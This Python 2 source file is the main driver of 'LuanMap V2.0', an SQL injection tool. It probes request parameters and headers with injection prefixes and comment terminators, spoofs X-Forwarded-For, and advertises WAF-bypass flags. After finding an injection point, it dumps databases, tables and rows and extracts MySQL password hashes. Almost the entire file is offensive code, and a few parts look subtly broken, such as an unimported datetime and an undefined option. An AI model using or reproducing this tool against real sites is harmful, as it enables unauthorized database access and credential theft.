# -*- coding:utf-8 -*-
import sys, os, getopt, signal, urlparse, copy, binascii, time
from sqli import *  ### Sql注入类
from output import Output  ### 输出Sql注入结果报表
from color import *  ### 输出彩色字符串
from req import Request_data  ### HTTP请求类
from optparse import OptionParser

def getTimeStr():
    return datetime.datetime.now().strftime('%H:%M:%S').join('[',']')
sqli_tech = "ET"

### 默认检测报错注入和时间注入,不能检测布尔注入


headers = {
    'X-Forwarded-For': '127.0.0.1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0'
}
### 判断后缀如果是空或者是收括号，就自动添加注释进行ByPass，如果有[#]就替换成注释

global db_notes
db_notes = ['#','-- ','`']

global payload_pad_map
payload_pad_map = {
    "(int)^": {
        "tech": "BET",
        "^": ""
    },
    ")-(": {
        "tech": "BET",
        ")-": "-("
    },
    "(string)^": {
        "tech": "ET",
        "'^": "^'"
    },
    "and": {
        "tech": "BET",
        "&&": "",
        "'&&": "&&'6'='6"
    },
    "(int)+": {
        "tech": "BET",
        "%2b": ""
    },
    "(string)+": {
        "tech": "ET",
        "'%2b": "%2b'"
    },
    "mod": {
        "tech": "ET",
        "mod": "",
        "'mod": "mod'"
    },
    "regexp": {
        "tech": "ET",
        "regexp(": ")",
        "'regexp(": ")[#]"
    },
    "<": {
        "tech": "ET",
        "<": "<",
        "'<": "<'"
    },
    ",": {
        "tech": "ET",
        ",": ",[rand_int]",
        "',": ",'"
    },

}


usage = 'LuanMap V2.0  Code By Luan  http://lu4n.com/\n\
        Luanmap [-u url --data postdata -r filename -p param]\n\
        [--dbs -D --tables -T --columns -C --dump --sql "select schema()"]\n\
        [--current-db --current-user --version --password]\n\
        [--tech B --truecode admin --payload bool_time --fast --time-sec 2]\n\
        [--hex --conv --bypass --modsec --safedog]\n\
        [--read-file --write-file --dest-file --sql-shell]\n\
        [--proxy http://127.0.0.1:8080]'

parser = OptionParser(usage=usage)
parser.add_option('-u','--url',action='store',type='string',dest='url',help='target url')
parser.add_option('--data',action='store',type='string',dest='postdata',default='',help='request post data')
parser.add_option('-p',action='store',type='string',dest='parameter',help='sql inject parameter in request')
parser.add_option('-r',action='store',type='string',dest='filename',help='request file')
parser.add_option('--sql',action='store',type='string',dest='sql',help='exec sql in sub query')
parser.add_option('-D',action='store',type='string',dest='db_name',help='db name')
parser.add_option("--dbs",action="store_true",dest="get_dbs",default=False,help='get all database name')
parser.add_option('-T',action='store',type='string',dest='table_name',help='db name')
parser.add_option("--tables",action="store_true",dest="get_tables",default=False,help='get all table name')
parser.add_option('-C',action='store',type='string',dest='column_names',help='db name')
parser.add_option("--columns",action="store_true",dest="get_columns",default=False,help='get all columns')
parser.add_option("--fast",action="store_true",dest="multi_thread",default=False,help='speed up by multi thread')
parser.add_option("--dump",action="store_true",dest="get_datas",default=False,help='dump data from database')
parser.add_option('--hex',action='store',dest='hex_encode_column_names',default=False,help='hex(column names)')
parser.add_option('--conv',action='store',dest='conv',default=False,help='conv hex result to char')
parser.add_option("--current-db",action="store_true",dest="get_current_db",default=False,help='select scheam()')
parser.add_option("--current-user",action="store_true",dest="get_current_user",default=False,help='select user()')
parser.add_option("--db-version",action="store_true",dest="get_db_version",default=False,help='select version()')
parser.add_option("--password",action="store_true",dest="get_password_hash",default=False,help='get root password hash')
parser.add_option('--tech',action='store',type='string',dest='tech',default='ET',help='sql inject tech,default ET')
parser.add_option('--payload',action='store',type='string',dest='sqli_payload',help='sql inject payload')
parser.add_option('--truecode',action='store',type='string',dest='truecode',default='',help='true code in bool blind sql inject')
parser.add_option('--time-sec',action='store',type='string',dest='time_sec',default='1',help='timeout in timebase blind sql inject')
parser.add_option('--proxy',action='store',type='string',dest='proxy',help='proxy server[http://127.0.0.1]')
(options,args) = parser.parse_args()
if not options.url and not options.filename:
    exit('Luanmap -u url or -r filename\nLuanmap -h for more')
global request_data
global trueCode
trueCode = options.truecode
out = Output()
def handler(signal_num, frame):
    print "\nuser aborted"
    try:
        out.end_table()
    except Exception:
        pass
    out.print_output()
    exit()
signal.signal(signal.SIGINT, handler)

if options.filename:
    f = open(options.filename,'r')
    lines = f.readlines()
    f.close()
    try:
        options.url = lines.pop(0).split(' ')[1]
        headers = {}
        have_post_data = False
        while lines != []:
            line = lines.pop(0).rstrip('\n')
            if line != '':
                headers[line.split(':')[0]] = ''.join(line.split(':')[1:]).lstrip() #去掉左边的空格，以后遇到问题，再看
            else:
                have_post_data = True
                break
        if have_post_data:
            options.postdata = '\n'.join(lines)
        if options.url[0] == '/':
            options.url = 'http://' + headers['Host']  + options.url
    except Exception:
        exit('Format Http Request Error!');
request_data = Request_data(req_data={
    'url': options.url,
    'get_dic': {},
    'postdata': options.postdata,
    'post_dic': {},
    'headers': headers
})
domain = urlparse.urlparse(request_data.data['url']).netloc.split(':')[0]
if os.path.exists(''.join([sys.path[0], '/output/', domain])) == False:
    os.makedirs(''.join([sys.path[0], '/output/', domain]))
if os.path.exists(''.join([sys.path[0], '/output/', domain, '/target.txt'])):
    f = open(''.join([sys.path[0], '/output/', domain, '/target.txt']), 'r')
    tmp_url = f.read()
    f.close()
    if request_data.data['url'] == tmp_url:
        if os.path.exists(''.join([sys.path[0], '/output/', domain, '/request.txt'])):
            printGreen('Luanmap resumed the injection point from stored session\n')
            request_data.readFile(''.join([sys.path[0], '/output/', domain, '/request.txt']))
# 在读取完req后再对部分属性进行重设定
if options.sqli_payload:
    request_data.sqli_payload = options.sqli_payload
request_data.proxy = options.proxy
request_data.multi_thread = options.multi_thread
request_data.time_sec = options.time_sec

def testSqli(test_request, payload_name):
    global request_data, trueCode
    test_injectable = 'U*'
    test_request.sqli_payload = payload_name
    if test_injectable == sqli(test_request,trueCode=trueCode).getSqliOutput('test_injectable'):
        printGreen("[*] Luanmap has identified injection point by : " + payload_name + '\n')
        request_data = test_request
        return True
    return False
def checkSqli(key, value):
    global request_data, trueCode, db_notes
    for index, payload_pads in enumerate(payload_pad_map):
        if set(list(sqli_tech)) & set(list(payload_pad_map[payload_pads]['tech'])) == set([]):
            continue
        for payload_prefix in payload_pad_map[payload_pads].keys():
            if payload_prefix == 'tech':
                continue
            payload_suffix = payload_pad_map[payload_pads][payload_prefix]
            for note in db_notes:
                _payload_suffix = payload_suffix.replace('[#]',note)
                test_request = copy.deepcopy(request_data)
                test_request.replace(value, ''.join([value, payload_prefix, '#InjectHere#', _payload_suffix]), key)
                if options.sqli_payload:
                    if testSqli(test_request,options.sqli_payload):
                        return True
                else:
                    for payload_name in payload_sql_map['sqli_map'].keys():
                        if ('B' if 'bool' in payload_name else 'E' if 'error' in payload_name else 'T' if 'time' in payload_name else '') in sqli_tech:
                            if payload_pads == '(int)^':
                                trueCode = '[reverse]' + trueCode # ^的特殊性: N ^ 1 != N; N ^ 0 == N 
                            if testSqli(test_request, payload_name):
                                trueCode = trueCode.replace('[reverse]','')
                                return True
                            trueCode = trueCode.replace('[reverse]','')
                if '[#]' not in payload_suffix:
                    break
    return False
if request_data.have_InjectHere() == False:
    if options.parameter:
        value = request_data.findValueByKey(options.parameter)
        if value == None:
            printRed(''.join(['[-] parameter \'', options.parameter, '\' not in request!\n']))
        else:
            printYellow(''.join(['[+] Testing parameter \'', options.parameter, '\'\n']))
            if checkSqli(options.parameter, value) == False:
                printRed(''.join(['[-] parameter \'', options.parameter, '\' appear to be not injectable\n']))
if request_data.have_InjectHere() == False:
    for key, value in request_data.data['get_dic'].items():
        printYellow(''.join(['[+] Testing Get parameter \'', key, '\'\n']))
        if checkSqli(key, value):
            break
        else:
            printRed(''.join(['[-] Get parameter \'', key, '\' appear to be not injectable\n']))
if request_data.have_InjectHere() == False and options.postdata:
    for key, value in request_data.data['post_dic'].items():
        printYellow(''.join(['[+] Testing Post parameter \'', key, '\'\n']))
        if checkSqli(key, value):
            break
        else:
            printRed(''.join(['[-] Post parameter \'', key, '\' appear to be not injectable\n']))
if request_data.have_InjectHere() == False and options.postdata:
    for key, value in request_data.data['headers'].items():
        printYellow(''.join(['[+] Testing Header parameter \'', key, '\'\n']))
        if checkSqli(key, value):
            break
        else:
            printRed(''.join(['[-] Header parameter \'', key, '\' appear to be not injectable\n']))
if request_data.have_InjectHere() == False:
    printRed('[-] All tested parameters appear to be not injectable\n')
    sys.exit()
else:
    f = open(''.join([sys.path[0], '/output/', domain, '/target.txt']), 'w')
    f.write(options.url)
    f.close()
    request_data.writeFile(''.join([sys.path[0], '\\output\\', domain, '\\request.txt']))


sqli = sqli(request_data,trueCode=trueCode)
out.create_table(2)
out.add_line(['Parameter', 'Type'])
out.add_line([request_data.get_InjectParameter(), request_data.sqli_payload])
out.end_table()

def printSqliOutput(sql,title=''):
    SqliOutput = sqli.getSqliOutput(sql)
    printGreen(sql.join(['[*] ',' => ']))
    print ''.join([SqliOutput,'\n'])
    out.create_table(1)
    out.add_line([sql if title == '' else title])
    out.add_line([SqliOutput])
    out.end_table()
if options.sql:
    printSqliOutput(options.sql)

if options.get_current_db:
    printSqliOutput('get_current_database','Current Database')

if options.get_current_user:
    printSqliOutput('get_current_user','Current User')

if options.get_db_version:
    printSqliOutput('get_version','Database Version')

if options.get_password_hash:
    out.create_table(3)
    out.add_line(['host', 'user', 'password'])
    user_count = sqli.getSqliOutput('get_user_count')
    out.create_table(3)
    out.add_line(['user', 'host', 'password'])
    print '[*] Get users [',
    printGreen(user_count)
    print ']:'
    for i in range(0, int(user_count)):
        dba_host = sqli.getSqliOutput('get_dba_host', {'index': str(i)})
        dba_password = sqli.getSqliOutput('get_dba_password', {'index': str(i)})
        out.add_line(['root', dba_host, dba_password])
        print ''.join(['\t[', str(i + 1), '] ']),
        printGreen(''.join([dba_host, ' ', dba_password, '\n']))
    out.end_table()

if options.get_dbs:
    database_count = sqli.getSqliOutput('get_database_count')
    out.create_table(1)
    out.add_line(['Get databases [' + database_count + ']'])
    print '[*] Get databases [',
    printGreen(database_count)
    print ']:'
    for i in range(0, int(database_count)):
        _db_name = sqli.getSqliOutput('get_database_name', {'index': str(i)})
        out.add_line([_db_name])
        print ''.join(['\t[', str(i + 1), '] ']),
        printGreen(''.join([_db_name, '\n']))
    out.end_table()

if options.get_tables and options.db_name:
    table_count = sqli.getSqliOutput('get_table_count', {'db_name': binascii.b2a_hex(options.db_name)})
    out.create_table(1)
    out.add_line(['Tables_in_' + options.db_name + ' [' + table_count + ']'])
    print ''.join(['[*] Get Database ', options.db_name, ' tables [']),
    printGreen(table_count)
    print ']:'
    for i in range(0, int(table_count)):
        _table_name = sqli.getSqliOutput('get_table_name',
                                         {'db_name': binascii.b2a_hex(options.db_name), 'index': str(i)})
        out.add_line([_table_name])
        print ''.join(['\t[', str(i + 1), '] ']),
        printGreen(''.join([_table_name, '\n']))
    out.end_table()

if options.get_columns and options.db_name and options.table_name:
    column_count = sqli.getSqliOutput('get_column_count', {'db_name': binascii.b2a_hex(options.db_name),
                                                           'table_name': binascii.b2a_hex(options.table_name)})
    out.create_table(1)
    out.add_line(['Columns_in_' + options.table_name + ' [' + column_count + ']'])
    print ''.join(['[*] Get Table ', options.table_name, ' columns [']),
    printGreen(column_count)
    print ']:'
    for i in range(0, int(column_count)):
        _column_name = sqli.getSqliOutput('get_column_name', {'db_name': binascii.b2a_hex(options.db_name),
                                                              'table_name': binascii.b2a_hex(options.table_name),
                                                              'index': str(i)})
        out.add_line([_column_name])
        print ''.join(['\t[', str(i + 1), '] ']),
        printGreen(''.join([_column_name, '\n']))
    out.end_table()

if options.get_datas and options.db_name and options.table_name:
    data_count = sqli.getSqliOutput('get_data_count', {'db_name': binascii.b2a_hex(options.db_name),
                                                       'table_name': binascii.b2a_hex(options.table_name),})
    out.create_table(1)
    out.add_line([''.join(['count (', options.db_name, '.', options.table_name, ')'])])
    out.add_line([''.join([data_count, ' entries'])])
    out.end_table()
    print ''.join(['[*] Get Table ', options.table_name, ' data [']),
    printGreen(data_count)
    print ']:'
    column_names = options.column_names.split(',')
    out.create_table(len(column_names))
    out.add_line(column_names)
    for i in range(0, int(data_count)):
        tmp = []
        for _column_name in column_names:
            # 由于我盲注方法的缺陷，想读到非ascii码字符只能用hex()来解决了
            _data_name = sqli.getSqliOutput('get_data_name',
                                            {'db_name': options.db_name,
                                             'table_name': options.table_name,
                                             'column_name': _column_name.join(['hex(',')']) if _column_name in options.hex_encode_column_names else _column_name,
                                             'order_by': column_names[0], 'index': str(i)})
            _data_name = binascii.a2b_hex(_data_name) if _column_name in options.hex_encode_column_names and options.conv_hex else _data_name
            tmp.append(_data_name)
            print ''.join(['\t[', str(i + 1), '] ']),
            printGreen(''.join([_data_name, '\n']))
        out.add_line(tmp)
    out.end_table()
out.print_output()